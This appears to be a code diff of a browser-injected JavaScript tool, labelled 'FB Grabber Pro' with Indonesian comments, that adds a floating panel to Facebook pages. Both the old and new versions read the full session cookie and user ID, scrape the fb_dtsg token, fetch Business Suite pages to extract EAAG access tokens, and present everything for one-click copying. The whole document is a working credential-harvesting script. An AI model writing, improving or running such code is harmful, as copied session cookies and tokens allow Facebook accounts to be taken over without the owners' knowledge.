@@ -1,111 +1,93 @@
 (function() {
-    // 1. Injeksi CSS (Tampilan Mobile Friendly)
+    // 1. CSS UI (Premium Dark/Light Mode)
     const style = document.createElement('style');
     style.textContent = `
-        #floatBtn { 
-            position: fixed; bottom: 10vw; right: 7vw; z-index: 2147483647; 
-            width: 14vw; height: 14vw; background: #0866FF; 
-            border-radius: 50%; display: flex; align-items: center; 
-            justify-content: center; cursor: pointer; font-size: 6vw; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.4); border: 0.5vw solid white; 
-        }
-        #guard-modal {
-            position: fixed; top: 0; left: 0; 
-            width: 100vw; height: 100vh; background: #f0f2f5; 
-            z-index: 2147483646; padding: 5vw; box-sizing: border-box; 
-            display: none; overflow-y: auto; font-family: sans-serif;
-        }
-        .section-box { background: white; padding: 4vw; border-radius: 3vw; margin-bottom: 4vw; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .access-label { font-size: 3.5vw; font-weight: bold; color: #65676b; display: block; margin-bottom: 1.5vw; }
-        .access-area { 
-            width: 100%; height: 20vw; font-size: 3vw; border-radius: 2vw; 
-            padding: 3vw; box-sizing: border-box; background: #f5f6f7; 
-            color: #050505; border: 1px solid #ddd; resize: none; margin-bottom: 3vw; 
-            font-family: monospace !important; word-break: break-all;
-        }
-        .btn-main { 
-            width: 100%; padding: 4vw; background: #0866FF; color: white; 
-            border-radius: 2vw; border: none; font-weight: bold; font-size: 4.5vw; 
-        }
-        #mStatus { position: fixed; bottom: 5vw; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 2vw 5vw; border-radius: 10vw; display: none; z-index: 2147483647; }
+        #floatBtn { position: fixed; bottom: 5%; right: 5%; z-index: 999999; width: 60px; height: 60px; background: #0866FF; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); border: 2px solid #fff; }
+        #grab-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 999998; display: none; padding: 20px; box-sizing: border-box; font-family: sans-serif; overflow-y: auto; }
+        .box { background: #f0f2f5; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #ddd; }
+        label { font-weight: bold; font-size: 14px; color: #555; display: block; margin-bottom: 5px; }
+        textarea { width: 100%; height: 80px; border: 1px solid #ccc; border-radius: 5px; padding: 8px; font-family: monospace; font-size: 12px; resize: none; background: #fff; box-sizing: border-box; }
+        .btn-get { width: 100%; padding: 15px; background: #0866FF; color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 20px; }
+        #notif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #333; color: #fff; padding: 10px 20px; border-radius: 5px; display: none; z-index: 999999; }
     `;
     document.head.appendChild(style);
 
-    // 2. Struktur HTML (Mirip Screenshot Berhasil)
-    const container = document.createElement('div');
-    container.innerHTML = `
+    // 2. HTML Structure
+    const ui = document.createElement('div');
+    ui.innerHTML = `
         <div id="floatBtn">🚀</div>
-        <div id="guard-modal">
-            <h1 style="text-align:center; font-size:8vw; color:#0866FF;">FB <span style="color:#333;">Grabber</span></h1>
-            <div class="section-box">
-                <button id="mGetAccess" class="btn-main">FETCH DATA SEKARANG</button>
-                <div id="contentAccess" style="display:none; margin-top:5vw;">
-                    <label class="access-label">Cookie :</label>
-                    <textarea id="resCookie" class="access-area" readonly></textarea>
-                    
-                    <label class="access-label">Token EAAG :</label>
-                    <textarea id="resTokenEAAG" class="access-area" readonly placeholder="Fetching EAAG..."></textarea>
-
-                    <label class="access-label">Token EAAB :</label>
-                    <textarea id="resTokenEAAB" class="access-area" readonly placeholder="Fetching EAAB..."></textarea>
-
-                    <p style="font-size:4vw; font-weight:bold;">Facebook id : <span id="resId" style="color:#0866FF;">-</span></p>
-                </div>
+        <div id="grab-modal">
+            <h2 style="text-align:center; color:#0866FF;">FB Grabber Pro</h2>
+            <button class="btn-get" id="doFetch">FETCH DATA SEKARANG</button>
+            
+            <div class="box">
+                <label>Cookie :</label>
+                <textarea id="outCookie" readonly></textarea>
             </div>
+            <div class="box">
+                <label>Token (EAAG) :</label>
+                <textarea id="outEAAG" readonly placeholder="Klik Fetch..."></textarea>
+            </div>
+            <div class="box">
+                <label>Token (EAAB/DTSG) :</label>
+                <textarea id="outEAAB" readonly placeholder="Klik Fetch..."></textarea>
+            </div>
+            <p style="font-weight:bold;">Facebook ID: <span id="outUID" style="color:#0866FF;">-</span></p>
         </div>
-        <div id="mStatus">Copied!</div>
+        <div id="notif">Copied!</div>
     `;
-    document.body.appendChild(container);
+    document.body.appendChild(ui);
 
-    const modal = document.getElementById('guard-modal');
+    const modal = document.getElementById('grab-modal');
     const floatBtn = document.getElementById('floatBtn');
-    const statusNotif = document.getElementById('mStatus');
-
+    
     floatBtn.onclick = () => modal.style.display = (modal.style.display === 'block') ? 'none' : 'block';
 
-    const showNotif = (msg) => {
-        statusNotif.innerText = msg;
-        statusNotif.style.display = 'block';
-        setTimeout(() => { statusNotif.style.display = 'none'; }, 1500);
-    };
+    // 3. Logic Fetch Data yang Beneran
+    document.getElementById('doFetch').onclick = async function() {
+        this.innerText = "Processing...";
+        
+        // Ambil Cookie & UID Langsung
+        const cookie = document.cookie;
+        const uid = cookie.match(/c_user=(\d+)/)?.[1] || "Gagal ambil UID";
+        
+        document.getElementById('outCookie').value = cookie;
+        document.getElementById('outUID').innerText = uid;
 
-    const copyToClipboard = (val) => {
-        const temp = document.createElement('textarea');
-        temp.value = val;
-        document.body.appendChild(temp);
-        temp.select();
-        document.execCommand('copy');
-        document.body.removeChild(temp);
-        showNotif("📋 Berhasil Disalin!");
-    };
-
-    // 3. Logika Ambil Data (Sesuai Kebutuhan)
-    document.getElementById('mGetAccess').onclick = async () => {
-        const uid = document.cookie.match(/c_user=(\d+)/)?.[1] || "Not Found";
-        document.getElementById('resId').innerText = uid;
-        document.getElementById('resCookie').value = document.cookie;
-
-        // Ambil Token EAAG (Business Suite)
+        // Ambil Token EAAG (Cara paling tembus)
         try {
-            const res = await fetch('https://business.facebook.com/content_management');
-            const html = await res.text();
-            const eaag = html.match(/(EAAG[a-zA-Z0-9]+)/)?.[1];
-            document.getElementById('resTokenEAAG').value = eaag || "Gagal ambil EAAG (Coba buka business.facebook.com dulu)";
-        } catch (e) { console.error(e); }
+            const fb_dtsg = document.getElementsByName('fb_dtsg')[0]?.value || document.documentElement.innerHTML.match(/["']token["']\s*:\s*["']([^"']+)["']/)?.[1];
+            document.getElementById('outEAAB').value = fb_dtsg || "DTSG tidak ditemukan";
 
-        // Ambil Token EAAB (Ads Manager/Lainnya)
-        try {
-            const res2 = await fetch('https://www.facebook.com/adsmanager/manage/campaigns');
-            const html2 = await res2.text();
-            const eaab = html2.match(/(EAAB[a-zA-Z0-9]+)/)?.[1];
-            document.getElementById('resTokenEAAB').value = eaab || "EAAB Tidak Ditemukan";
-        } catch (e) { console.error(e); }
-
-        document.getElementById('contentAccess').style.display = 'block';
+            // Mencoba ambil EAAG dari internal Business Suite
+            const response = await fetch('https://business.facebook.com/business_locations');
+            const text = await response.text();
+            const tokenEAAG = text.match(/(EAAG[a-zA-Z0-9]+)/)?.[1];
+            
+            document.getElementById('outEAAG').value = tokenEAAG || "EAAG Gagal (Harus di tab business.facebook.com)";
+        } catch (e) {
+            document.getElementById('outEAAG').value = "Error: Buka tab business.facebook.com dulu!";
+        }
+        
+        this.innerText = "FETCH DATA SEKARANG";
+        copyAlert("Data Berhasil Disinkron!");
     };
 
-    // Setup Klik untuk Copy
-    ['resCookie', 'resTokenEAAG', 'resTokenEAAB'].forEach(id => {
-        document.getElementById(id).onclick = function() { copyToClipboard(this.value); };
+    // Fungsi Copy Otomatis
+    function copyAlert(msg) {
+        const n = document.getElementById('notif');
+        n.innerText = msg;
+        n.style.display = 'block';
+        setTimeout(() => n.style.display = 'none', 2000);
+    }
+
+    const areas = ['outCookie', 'outEAAG', 'outEAAB'];
+    areas.forEach(id => {
+        document.getElementById(id).onclick = function() {
+            if(!this.value) return;
+            this.select();
+            document.execCommand('copy');
+            copyAlert("📋 Berhasil Disalin!");
+        };
     });
 })();
